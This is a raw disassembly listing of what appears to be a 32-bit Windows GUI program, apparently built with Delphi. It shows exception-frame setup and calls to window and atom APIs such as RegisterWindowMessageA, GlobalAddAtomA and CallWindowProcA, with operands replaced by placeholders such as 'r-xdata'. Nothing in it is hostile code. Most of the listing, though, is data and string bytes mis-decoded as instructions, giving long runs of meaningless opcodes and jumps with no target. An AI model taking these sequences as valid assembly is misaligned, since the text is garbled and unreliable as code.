xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ca24
retn
sub_42ca30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ca55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ca5c
retn
sub_42cad4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42caf9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cb00
retn
sub_42cb0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cb31
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cb38
retn
sub_42cb48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xcc
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl

sub_42cb66
inc edx
add [ eax ] bl
add [ eax ] al
and al 0x6c
inc ecx
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
push esp
int 0x42
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add al bh
int3
sub_42ccf8
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421018
test bl bl
jle r-xdata
call sub_4220f4
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_42cd2c
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_469d2c
mov cl 0x1
sub_42cd54
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_40338c
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42cd8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42cdb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ce24
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_460708
mov [ ebp - 0x14 ] eax
call sub_460624
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42cee7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46961c
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42ceb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cec0
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_469678
retn
sub_42cec0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ceee
mov eax [ ebp - 0x14 ]
call sub_4607bc
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_46062c
retn
sub_42cfc4
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408d74
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42d077
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0x48 ] bl
add [ ebx + edi * 2 + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ eax + 0x8 ] bl
dec eax
add [ eax - 0x80 ] bl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0x48 ] dl
add [ eax ] dl
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
or [ eax ] cl
adc [ eax + ecx * 2 ] bh
add [ eax ] al
add [ eax ] al
add al 0x8
dec eax
add [ eax + eax * 4 ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x8 ] dl
dec eax
add [ esi + edi * 2 + 0x48 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0x48 ] cl
add al ah
jg r-xdata
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42d16a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] cl
mov [ eax + 0x48 ] es
add [ eax ] al
cld
pop es
dec eax
add [ eax ] bl
jle r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x8 ] cl
dec eax
add [ eax + 0x487d ] al
add [ eax ] al
add [ eax + ecx + 0x48 ] al
add [ eax + 0x487e ] ch
add [ eax ] al
add [ eax + 0x8 ] al
dec eax
add [ eax + 0x487d ] dh
add [ eax ] al
add [ eax + ecx ] bh
dec eax
add [ ecx + eax * 4 ] dl
dec eax
mov [ fs : eax ] edx
push sub_42d171
retn
xor eax eax
pop edx
pop ecx
pop ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_4049cc
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42d174
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403ca0
call sub_42cfc4
mov eax [ r-xdata ]
call sub_417be4
mov eax [ r-xdata ]
call sub_417c84
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417c30
sub_42d1f1
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add al dl
fiadd [ edx ]
nop
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x10042de ] al
add bh ch
inc [ eax - 0x20 ]
inc edx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xd2449072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42d20072
add [ eax ] ah
insd
inc ecx
add [ 0x78450800 ] al
je r-xdata
dec ecx
outsb
je r-xdata
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add ah bh
and eax [ ebp ]
[ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
aam 0x42
insb
jae r-xdata
add ah dl
out 0x42 al
add [ ebx + eax + 0x69c0045 ] ch
inc ebp
add [ eax ] al
jecxz r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x42 ] dl
add [ ecx - 0x1957ffbb ] al
inc edx
inc esp
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
inc esp
add al dh
xchg edx eax
popad
insb
add al 0x57
inc ecx
add [ eax ] bh
add [ eax ] al
[ eax ]
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
inc eax
add [ eax ] al
add bh bh
or al ah
inc edx
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
dec [ eax ]
loopne r-xdata
or al 0x54
inc ebx
jne r-xdata
add [ edi ] al
add [ ebx ] bh
mov al 0x12
mov al 0x10
mov al 0x32
mov al 0x47
add [ eax ] bh
mov al 0xca
[ ecx + 0x42 ]
je r-xdata
add [ eax + 0x3e8 ] al
inc eax
add [ eax ] dh
add [ eax ] al
[ eax ]
loopne r-xdata
sub al ah
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x42d31472
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
rol [ edx ] cl
or al 0xd4
inc edx
add [ edx + eax ] ah
add [ eax ] al
sbb al 0x63
inc esp
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ah dl
inc edx
add eax [ eax ]
or [ ecx + 0x6e ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
add ah dl
out 0x42 al
add [ ebx + eax + 0x69c0045 ] ch
inc ebp
add [ eax ] al
jecxz r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
inc esp
add al dh
xchg edx eax
insd
push eax
popad
outsb
insb
adc al 0xd3
inc edx
add [ esp + 0x44 ] cl
add [ ebx ] cl
add [ eax ] cl
inc ebp
js r-xdata
or eax [ eax ]
add eax 0x67696c41
outsb
dec eax
push ebp
inc ecx
add [ eax ] ah
add al [ eax ]
add [ esi ] al
push esp
push eax
popad
outsb
insb
nop
inc edx
cmp al 0x14
inc ebx
je r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
push esp
dec esi
inc esp
add [ ecx ] ah
add bh bh
je r-xdata
je r-xdata
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x42 ] dl
add [ ecx - 0x1957ffbb ] al
inc edx
adc al 0x42
insb
jae r-xdata
push 0x70042d5
push es
push esp
push eax
popad
outsb
insb
nop
aam 0x42
add [ esp + edx * 8 ] bl
inc edx
add [ edx ] al
or [ ebp + 0x78 ] al
je r-xdata
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x42d5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 8 + 0x42 ] bl
add [ eax ] ch
add al [ eax ]
add al cl
rol [ edx ] cl
cmp al 0x17
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
loop r-xdata
add bh bh
shl ah 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
mov esp 0x5f004155
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
mov ah ah
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
add [ edi + eax * 2 ] ch
inc esp
add [ ebx ] bl
add bh bh
xor al 0x93
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add ah bh
and eax [ ebp ]
[ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
push [ eax ]
add dh bh
inc esp
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xcc65646f
pop esp
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
inc esp
add [ eax ] bl
add al [ eax ]
add [ eax ] al
adc [ edx ] 0x0
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x5ccc6564
insb
dec ecx
outsb
outsb
jb r-xdata
inc ebx
jb r-xdata
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
inc esp
add [ edx ] dl
add al [ eax ]
jmp [ esp + 0x10042 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x5cff0001 ] ah
or [ ebp ] al
or [ eax ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
cld
dec ebp
inc esp
add [ eax ] ah
sahf
inc esp
add [ eax - 0x62 ] dl
inc esp
add [ esi + edi * 4 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
[ 0x1ff0002 ]
jae r-xdata
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edi - 0x4f00ffff ] ah
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add al bl
sbb [ ebp ] al
mov esp 0x1ffe0000
add al [ eax ]
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50100023 ] al
popad
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
add bh bh
rcr [ edi - 0x6023ffbc ] 0x44
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
push ss
add [ 0x6f6c6f43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x14ff0000
lahf
inc esp
add [ edi + ebx * 4 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
popad
outsb
popad
jb r-xdata
dec ebp
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec ebp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
adc al 0x47
adc [ eax ] al
test al 0x1
add bh bh
clc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
insb
outsd
dec esi
inc esp
add [ eax + eax ] dh
push esp
retn 0x44
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
fcomp [ eax ]
inc ebp
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
mov eax 0x38004508
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
xor [ eax ] 0x0
jpe r-xdata
popad
outsb
push edx
jae r-xdata
jb r-xdata
inc eax
popfd
jo r-xdata
adc [ eax ] al
0x94ff0000 0x449f
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
in al 0x9f
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941db66
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] al
add al 0x57
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x9 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
dec esp
lahf
inc esp
add [ ecx ] al
or [ ebp ] al
cmp [ ecx ] cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
and eax 0x61500b00
jb r-xdata
adc [ eax ] al
test eax 0x8cff0001
or [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
movsb [ edi ] [ esi ]
push ecx
inc esp
add al ch
push eax
outsd
jo r-xdata
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xe4656c62
push esp
inc esp
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
adc [ eax ] al
push edi
add [ eax ] al
inc [ eax - 0x63 ]
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x61 ]
add [ eax - 0x1 ] al
sub al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
mov es [ ebp ]
jl r-xdata
inc edi
je r-xdata
add al 0x57
inc ecx
add al al
push edi
jo r-xdata
add [ eax ] al
jo r-xdata
jo r-xdata
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
dec ebp
inc esp
add [ eax + 0x38004508 ] bh
add bh bh
fcomp [ ebp + 0x10044 ]
add [ eax ] al
mov eax 0xe000444f
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0xb86f666e
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
inc esp
jb r-xdata
push ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
push esp
push ebp
inc esp
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13002f ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
push edx
inc esp
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc esp
add [ eax ] bh
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080029 ] al
push 0x6948776f
outsb
je r-xdata
push esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
inc esp
outsd
ja r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
push edi
inc ecx
add al cl
add [ eax + 0x4f070038 ] al
add [ eax ] al
dec edi
jbe r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
jo r-xdata
clc
jb r-xdata
xor [ eax + 0x44 ] dl
add al bl
add [ eax ] al
or ecx [ edi + 0x6e ]
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
push ebx
inc esp
add [ eax - 0x4700ffff ] bh
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424514
inc esp
outsd
arpl [ ebx + 0x4 ] bp
push edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
push esp
inc esp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push edx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
[ eax ]
push edi
inc ecx
add [ eax ] ch
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
jb r-xdata
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424c60
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424514
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
